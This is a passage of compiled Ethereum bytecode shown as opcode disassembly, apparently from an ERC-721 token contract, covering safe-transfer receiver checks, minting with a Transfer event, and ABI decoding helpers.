0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x12AA SWAP2 SWAP1 PUSH2 0x1F25 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST JUMPDEST POP POP POP POP JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x12E0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x14B1 JUMP JUMPDEST ISZERO PUSH2 0x1449 JUMPI DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x150B7A02 PUSH2 0x1309 PUSH2 0xADE JUMP JUMPDEST DUP8 DUP7 DUP7 PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x132B SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x1C73 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1345 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x1376 JUMPI POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1373 SWAP2 SWAP1 PUSH2 0x19BB JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH2 0x13F9 JUMPI RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x13A6 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x13AB JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD EQ ISZERO PUSH2 0x13F1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x13E8 SWAP1 PUSH2 0x1D1C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 MLOAD DUP2 PUSH1 0x20 ADD REVERT JUMPDEST PUSH4 0x150B7A02 PUSH1 0xE0 SHL PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ SWAP2 POP POP PUSH2 0x144E JUMP JUMPDEST PUSH1 0x1 SWAP1 POP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH2 0x1460 DUP4 DUP4 PUSH2 0x14D4 JUMP JUMPDEST PUSH2 0x146D PUSH1 0x0 DUP5 DUP5 DUP5 PUSH2 0x12BF JUMP JUMPDEST PUSH2 0x14AC JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x14A3 SWAP1 PUSH2 0x1D1C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EXTCODESIZE GT SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x1544 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x153B SWAP1 PUSH2 0x1DDC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x154D DUP2 PUSH2 0x1152 JUMP JUMPDEST ISZERO PUSH2 0x158D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1584 SWAP1 PUSH2 0x1D5C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x159B PUSH1 0x0 DUP4 DUP4 PUSH1 0x1 PUSH2 0x1193 JUMP JUMPDEST PUSH2 0x15A4 DUP2 PUSH2 0x1152 JUMP JUMPDEST ISZERO PUSH2 0x15E4 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x15DB SWAP1 PUSH2 0x1D5C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 PUSH2 0x16EE PUSH1 0x0 DUP4 DUP4 PUSH1 0x1 PUSH2 0x12B9 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1705 PUSH2 0x1700 DUP5 PUSH2 0x1EBC JUMP JUMPDEST PUSH2 0x1E97 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x1721 JUMPI PUSH2 0x1720 PUSH2 0x215A JUMP JUMPDEST JUMPDEST PUSH2 0x172C DUP5 DUP3 DUP6 PUSH2 0x2023 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1743 DUP2 PUSH2 0x2496 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1758 DUP2 PUSH2 0x24AD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x176D DUP2 PUSH2 0x24C4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x1782 DUP2 PUSH2 0x24C4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x179D JUMPI PUSH2 0x179C PUSH2 0x2155 JUMP JUMPDEST JUMPDEST DUP2 CALLDATALOAD PUSH2 0x17AD DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x16F2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x17C5 DUP2 PUSH2 0x24DB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x17E1 JUMPI PUSH2 0x17E0 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x17EF DUP5 DUP3 DUP6 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x180F JUMPI PUSH2 0x180E PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x181D DUP6 DUP3 DUP7 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x182E DUP6 DUP3 DUP7 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x1851 JUMPI PUSH2 0x1850 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x185F DUP7 DUP3 DUP8 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0x1870 DUP7 DUP3 DUP8 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0x1881 DUP7 DUP3 DUP8 ADD PUSH2 0x17B6 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x80 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x18A5 JUMPI PUSH2 0x18A4 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x18B3 DUP8 DUP3 DUP9 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP5 POP POP PUSH1 0x20 PUSH2 0x18C4 DUP8 DUP3 DUP9 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x40 PUSH2 0x18D5 DUP8 DUP3 DUP9 ADD PUSH2 0x17B6 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x60 DUP6 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x18F6 JUMPI PUSH2 0x18F5 PUSH2 0x215F JUMP JUMPDEST JUMPDEST PUSH2 0x1902 DUP8 DUP3 DUP9 ADD PUSH2 0x1788 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1925 JUMPI PUSH2 0x1924 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1933 DUP6 DUP3 DUP7 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1944 DUP6 DUP3 DUP7 ADD PUSH2 0x1749 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1965 JUMPI PUSH2 0x1964 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1973 DUP6 DUP3 DUP7 ADD PUSH2 0x1734 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1984 DUP6 DUP3 DUP7 ADD PUSH2 0x17B6 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x19A4 JUMPI PUSH2 0x19A3 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x19B2 DUP5 DUP3 DUP6 ADD PUSH2 0x175E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x19D1 JUMPI PUSH2 0x19D0 PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x19DF DUP5 DUP3 DUP6 ADD PUSH2 0x1773 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x19FE JUMPI PUSH2 0x19FD PUSH2 0x2164 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1A0C DUP5 DUP3 DUP6 ADD PUSH2 0x17B6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1A1E DUP2 PUSH2 0x1FAF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1A2D DUP2 PUSH2 0x1FC1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A3E DUP3 PUSH2 0x1EED JUMP JUMPDEST PUSH2 0x1A48 DUP2 DUP6 PUSH2 0x1F03 JUMP JUMPDEST SWAP4 POP PUSH2 0x1A58 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2032 JUMP JUMPDEST PUSH2 0x1A61 DUP2 PUSH2 0x2169 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A77 DUP3 PUSH2 0x1EF8 JUMP JUMPDEST PUSH2 0x1A81 DUP2 DUP6 PUSH2 0x1F14 JUMP JUMPDEST SWAP4 POP PUSH2 0x1A91 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2032 JUMP JUMPDEST PUSH2 0x1A9A DUP2 PUSH2 0x2169 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AB2 PUSH1 0x2D DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1ABD DUP3 PUSH2 0x217A JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AD5 PUSH1 0x32 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1AE0 DUP3 PUSH2 0x21C9 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AF8 PUSH1 0x25 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B03 DUP3 PUSH2 0x2218 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B1B PUSH1 0x1C DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B26 DUP3 PUSH2 0x2267 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B3E PUSH1 0x24 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B49 DUP3 PUSH2 0x2290 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B61 PUSH1 0x19 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B6C DUP3 PUSH2 0x22DF JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B84 PUSH1 0x29 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B8F DUP3 PUSH2 0x2308 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BA7 PUSH1 0x20 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1BB2 DUP3 PUSH2 0x2357 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BCA PUSH1 0x18 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1BD5 DUP3 PUSH2 0x2380 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BED PUSH1 0x30 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1BF8 DUP3 PUSH2 0x23A9 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C10 PUSH1 0x21 DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1C1B DUP3 PUSH2 0x23F8 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C33 PUSH1 0x3D DUP4 PUSH2 0x1F14 JUMP JUMPDEST SWAP2 POP PUSH2 0x1C3E DUP3 PUSH2 0x2447 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C52 DUP2 PUSH2 0x2019 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1C6D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1A15 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x80 DUP3 ADD SWAP1 POP PUSH2 0x1C88 PUSH1 0x0 DUP4 ADD DUP8 PUSH2 0x1A15 JUMP JUMPDEST PUSH2 0x1C95 PUSH1 0x20 DUP4 ADD DUP7 PUSH2 0x1A15 JUMP JUMPDEST PUSH2 0x1CA2 PUSH1 0x40 DUP4 ADD DUP6 PUSH2 0x1C49 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x60 DUP4 ADD MSTORE PUSH2 0x1CB4 DUP2 DUP5 PUSH2 0x1A33 JUMP JUMPDEST SWAP1 POP SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1CD4 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1A24 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1CF4 DUP2 DUP5 PUSH2 0x1A6C JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D15 DUP2 PUSH2 0x1AA5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D35 DUP2 PUSH2 0x1AC8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D55 DUP2 PUSH2 0x1AEB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D75 DUP2 PUSH2 0x1B0E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D95 DUP2 PUSH2 0x1B31 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1DB5 DUP2 PUSH2 0x1B54 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1DD5 DUP2 PUSH2 0x1B77 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1DF5 DUP2 PUSH2 0x1B9A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E15 DUP2 PUSH2 0x1BBD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E35 DUP2 PUSH2 0x1BE0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E55 DUP2 PUSH2 0x1C03 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E75 DUP2 PUSH2 0x1C26 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1E91 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1C49 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1EA1 PUSH2 0x1EB2 JUMP JUMPDEST SWAP1 POP PUSH2 0x1EAD DUP3 DUP3 PUSH2 0x2097 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x1ED7 JUMPI PUSH2 0x1ED6 PUSH2 0x2126 JUMP JUMPDEST JUMPDEST PUSH2 0x1EE0 DUP3 PUSH2 0x2169 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F30 DUP3 PUSH2 0x2019 JUMP JUMPDEST SWAP2 POP PUSH2 0x1F3B DUP4 PUSH2 0x2019 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x1F70 JUMPI PUSH2 0x1F6F PUSH2 0x20C8 JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F86 DUP3 PUSH2 0x2019 JUMP JUMPDEST SWAP2 POP PUSH2 0x1F91 DUP4 PUSH2 0x2019 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x1FA4 JUMPI PUSH2 0x1FA3 PUSH2 0x20C8 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1FBA DUP3 PUSH2 0x1FF9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH1 0x0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2050 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2035 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x205F JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x207D JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 EQ ISZERO PUSH2 0x2091 JUMPI PUSH2 0x2090 PUSH2 0x20F7 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x20A0 DUP3 PUSH2 0x2169 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x20BF JUMPI PUSH2 0x20BE PUSH2 0x2126 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 